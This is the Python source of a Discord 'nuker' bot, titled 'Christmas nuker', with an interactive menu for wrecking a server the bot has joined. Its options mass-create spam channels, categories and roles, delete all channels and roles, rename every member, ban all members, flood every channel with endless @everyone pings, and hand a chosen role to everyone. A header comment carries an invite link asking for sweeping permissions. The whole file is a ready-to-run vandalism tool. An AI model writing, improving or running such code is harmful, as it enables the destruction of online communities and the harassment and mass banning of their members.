# https://discord.com/api/oauth2/authorize?client_id=873335066913308682&permissions=536870911991&scope=bot
import datetime
import os
import platform
import time
from discord.ext import commands
from discord.ext.commands import bot
from discord.utils import get
import discord
from random import *
import string
from colorama import Fore, init


intents = discord.Intents.default()
intents.members = True

bottoken = "token"

bot = commands.Bot(command_prefix='!', intents=intents)
bot.remove_command("help")
characters = string.ascii_letters + string.digits


def clear(): os.system("cls" if platform.system() == "Windows"
                       else "clear")


clear()
os.system("title Christmas nuker - ho ho ho")


menu = f"""{Fore.RED}                                                          
███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ ██████╗ ██████╗  
████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗ 
██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝ 
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗ 
██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║██║  ██║██║  ██║ 
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ 
{Fore.RED}[1] = Text Channel Creation.
{Fore.GREEN}[2] = Voice Channel Creation.
{Fore.RED}[3] = Category Creation.
{Fore.GREEN}[4] = Role Creation.
{Fore.RED}[5] = Delete All Channels and Categories.
{Fore.GREEN}[6] = Delete All Roles.
{Fore.RED}[7] = Nickname All Members.
{Fore.GREEN}[8] = Ban All Members.{Fore.RED}
{Fore.RED}[9] = Ping Everyone In Every Channel.{Fore.GREEN}
{Fore.GREEN}[10] = Give everyone specific role
{Fore.RED}Available servers:
"""


@bot.event
async def on_connect():
    clear()
    print(f"{Fore.RED}[!] Connected to bot : {bot.user.name} :)")
    os.system(f"title [!] Connected to bot : {bot.user.name} :)")


@bot.event
async def on_ready() -> None:
    print(f"{Fore.GREEN}[+] Ready with bot : {bot.user.name} :)")
    os.system(f"title [+] Ready with bot : {bot.user.name} :)")
    time.sleep(1)
    while True:
        clear()
        guilds = [f"{guild} ~ {guild.id}\n" for guild in bot.guilds]
        guilds = "".join(guilds)
        option = input(f"{Fore.CYAN}{menu}{Fore.MAGENTA}{guilds}{Fore.RED}[>]")
        if option == "1":  # text channel creation
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of text channels to make?\n[>] "))
            name = input(
                "[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range(amount):
                if random == "RANDOM":
                    name = "".join(choice(characters)
                                   for x in range(randint(4, 15)))
                await guild.create_text_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(
                    f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Text Channel Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating text channels - [{i+1}]")
            input(
                f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ]{Fore.GREEN} Created All Channels {Fore.RED}:{Fore.WHITE} [{i+1}] ")

        elif "2" in option:  # voice channel creation
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of voice channels to make?\n[>] "))
            name = input(
                "[!] Name of channels to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range(amount):
                if random == "RANDOM":
                    name = "".join(choice(characters)
                                   for x in range(randint(4, 15)))
                await guild.create_voice_channel(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(
                    f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Voice Channel Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating voice channels - [{i+1}]")
            input(
                f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Created All Channels {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")

        elif "3" in option:  # category creation
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of categories to make?\n[>] "))
            name = input(
                "[!] Name of categories to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            for i in range(amount):
                if random == "RANDOM":
                    name = "".join(choice(characters)
                                   for x in range(randint(4, 15)))
                await guild.create_category(name)
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(
                    f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Categories Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating categories - [{i+1}]")
            input(
                f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Created All Categories {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")

        elif "4" in option:  # role creation
            guild_id = int(input("[!] Guild ID?\n[>] "))
            guild = await bot.fetch_guild(guild_id)
            amount = int(input("[!] Number of roles to make?\n[>] "))
            name = input(
                "[!] Name of roles to make? Type RANDOM for random character names!\n[>] ")
            random = name.upper()
            colorcount = "red"
            for i in range(amount):
                if random == "RANDOM":
                    name = "".join(choice(characters)
                                   for x in range(randint(4, 15)))
                if colorcount == "red":
                    await guild.create_role(name=name, color=discord.Color.red())
                    colorcount = "green"
                elif colorcount == "green":
                    await guild.create_role(name=name, color=discord.Color.green())
                    colorcount = "red"
                currentDT = datetime.datetime.now()
                hour = str(currentDT.hour)
                minute = str(currentDT.minute)
                second = str(currentDT.second)
                print(
                    f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Role Created{Fore.RED} :{Fore.WHITE} {name}")
                os.system(f"title Spam creating roles - [{i+1}]")
            input(
                f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Created All Roles {Fore.RED}:{Fore.WHITE} [{i+1}] \n[>] ")

        elif "5" in option:  # delete all categories and channels
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            for guild in bot.guilds:
                if guild.id == id:
                    for chan in guild.channels:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await chan.delete()
                            os.system(
                                f"title Deleting all channels - [{count}]")
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Channel Deleted{Fore.RED} :{Fore.WHITE} {chan.name}")
                        except:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Error Deleting Channel {Fore.RED} :{Fore.WHITE} {chan.name}")
                    input(
                        f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Deleted all channels {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")

        elif "6" in option:  # delete all roles
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            for guild in bot.guilds:
                if guild.id == id:
                    for rol in guild.roles:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await rol.delete()
                            os.system(f"title Deleting all roles - [{count}]")
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Role Deleted{Fore.RED} :{Fore.WHITE} {rol.name}")
                        except:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Error Deleting Role {Fore.RED} :{Fore.WHITE} {rol.name}")
                    input(
                        f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Deleted all Roles {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")

        elif "7" in option:  # nickname all members
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            nick = input(
                "[!] Name of nicknames to change? Type RANDOM for random character names!\n[>] ")
            random = nick.upper()
            for guild in bot.guilds:
                if guild.id == id:
                    for mem in guild.members:
                        try:
                            if random == "RANDOM":
                                nick = "".join(choice(characters)
                                               for x in range(randint(4, 15)))
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.edit(nick=nick)
                            os.system(
                                f"title Changing All Nicknames - [{count}]")
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Nickname Changed {Fore.RED} :{Fore.WHITE} {mem.name} > {nick}")
                        except:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Problem Changing Nickname {Fore.RED} :{Fore.WHITE} {mem.name}")
                    input(
                        f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Changed All Nicknames {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")

        elif "8" in option:  # ban all members
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            for guild in bot.guilds:
                if guild.id == id:
                    for mem in guild.members:
                        try:
                            currentDT = datetime.datetime.now()
                            hour = str(currentDT.hour)
                            minute = str(currentDT.minute)
                            second = str(currentDT.second)
                            count = count + 1
                            await mem.ban()
                            os.system(f"title Banning Everyone - [{count}]")
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} User Banned: {Fore.RED} :{Fore.WHITE} {mem.name}")
                        except:
                            print(
                                f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Problem Banning {Fore.RED} :{Fore.WHITE} {mem.name}")
                    input(
                        f"{Fore.RED}[  {Fore.GREEN}  +  {Fore.RED} ] {Fore.GREEN}Finished Banning... {Fore.RED}:{Fore.WHITE} [{count}] \n[>] ")

        elif "9" in option:  # spam ping everyone
            count = int(0)
            id = int(input("[!] Guild ID?\n[>] "))
            messageee = input("After the @everyone, what should I say?\n[>] ")
            for guild in bot.guilds:
                if guild.id == id:
                    while True:
                        for chan in guild.channels:
                            try:
                                currentDT = datetime.datetime.now()
                                hour = str(currentDT.hour)
                                minute = str(currentDT.minute)
                                second = str(currentDT.second)
                                count = count + 1
                                await chan.send(f"@everyone {messageee}")
                                os.system(f"title Messages Sent : [{count}]")
                                print(
                                    f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Sent [@everyone {messageee}] in{Fore.RED} :{Fore.WHITE} {chan.name}")
                            except:
                                print(
                                    f"{Fore.RED}[{Fore.WHITE}{hour}:{minute}:{second}{Fore.RED}]{Fore.GREEN} Error Messaging Channel {Fore.RED} :{Fore.WHITE} {chan.name}")
        elif "10" in option:  # give everyone specific role
            id = int(input("[!] Guild ID?\n[>] "))
            role = input("[!] Role name?\n[>] ")
            for guild in bot.guilds:
                if guild.id == id:
                    for m in guild.members:
                        try:
                            await m.add_roles(discord.utils.get(guild.roles, name=role))
                            print(f"gave {m} {role}")
                        except:
                            print("[!] Error")

        else:
            print(f"{Fore.GREEN} Invalid Input {option} ")
            time.sleep(3)

bot.run(bottoken)
